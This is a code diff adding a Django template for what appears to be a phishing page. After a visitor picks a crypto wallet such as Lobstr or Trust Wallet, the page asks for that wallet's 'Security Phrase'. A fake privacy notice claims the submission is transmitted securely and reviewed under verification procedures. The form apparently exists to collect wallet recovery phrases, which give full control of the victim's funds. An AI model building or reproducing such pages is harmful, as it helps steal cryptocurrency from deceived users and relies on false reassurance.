@@ -1,0 +1,127 @@
+{% extends "qfs/qfs_base.html" %}
+{% load static %}
+
+{% block content %}
+
+<div class="min-h-screen bg-slate-950 text-white">
+
+    <div class="max-w-3xl mx-auto px-6 py-16">
+
+        <div class="mb-10">
+
+            <a href="{% url 'qfs_cards' %}"
+               class="inline-flex items-center text-slate-400 hover:text-white transition">
+
+                ← Back
+
+            </a>
+
+        </div>
+
+        <div class="rounded-3xl border border-slate-700 bg-slate-900 shadow-2xl overflow-hidden">
+
+            <!-- Header -->
+
+            <div class="bg-gradient-to-r from-blue-700 via-indigo-700 to-slate-900 p-8">
+
+                <!-- <p class="uppercase tracking-[0.25em] text-sm text-slate-300">
+
+                    Link selected wallet
+
+                </p> -->
+                                        {% if card.title|lower == 'lobstr wallet' %}
+
+                <img src="{% static 'home_media/lbst.png' %}" class="w-16 h-16" alt="">
+                {% elif card.title|lower == 'trust wallet' %}
+                        <img src="{% static 'home_media/tr.png' %}" class="w-16 h-16" alt="">
+
+                {% endif %}
+
+
+                <h1 class="text-4xl font-bold mt-3">
+
+                    {{ card.title }}
+
+                </h1>
+
+                {% if card.description %}
+                <p class="mt-4 text-slate-200 leading-relaxed">
+
+                    {{ card.description }}
+
+                </p>
+                {% endif %}
+
+            </div>
+
+            <!-- Form -->
+
+            <div class="p-8">
+
+                <form method="post" class="space-y-8">
+
+                    {% csrf_token %}
+
+                    <div>
+
+                        <label class="block text-lg font-semibold mb-3">
+
+                            Security Phrase
+
+                        </label>
+
+                        <p class="text-slate-400 text-sm mb-4">
+
+                            Please enter the required security phrase associated
+                            with this platform.
+
+                        </p>
+
+                        {{ form.phrase }}
+
+                        {% if form.phrase.errors %}
+                        <div class="mt-2 text-red-400 text-sm">
+                            {{ form.phrase.errors }}
+                        </div>
+                        {% endif %}
+
+                    </div>
+
+                    <div class="rounded-xl bg-slate-800 border border-slate-700 p-5">
+
+                        <h3 class="font-semibold mb-2">
+
+                            Privacy Notice
+
+                        </h3>
+
+                        <p class="text-slate-400 text-sm leading-7">
+
+                            Your submission is transmitted securely and will be
+                            reviewed according to our verification procedures.
+                            Please ensure all information entered is accurate
+                            before continuing.
+
+                        </p>
+
+                    </div>
+
+                    <button
+                        type="submit"
+                        class="w-full rounded-2xl bg-blue-600 hover:bg-blue-700 transition py-4 text-lg font-semibold">
+
+                        Continue
+
+                    </button>
+
+                </form>
+
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+{% endblock %}
